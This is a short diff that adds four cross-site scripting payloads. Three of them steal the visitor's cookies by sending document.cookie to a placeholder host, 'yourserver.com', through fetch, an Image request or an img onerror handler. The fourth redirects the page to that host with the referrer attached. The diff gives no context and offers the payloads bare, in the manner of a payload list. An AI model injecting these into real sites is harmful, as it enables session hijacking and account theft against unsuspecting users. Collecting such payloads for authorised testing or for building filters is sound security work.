@@ -1,0 +1,4 @@
+<script>fetch('http://yourserver.com?c='+document.cookie)</script>
+<img src=x onerror='new Image().src="http://yourserver.com?c="+document.cookie'>
+<script>var i=new Image;i.src='http://yourserver.com/'+document.cookie</script>
+<script>location='http://yourserver.com/?ref='+document.referrer</script>
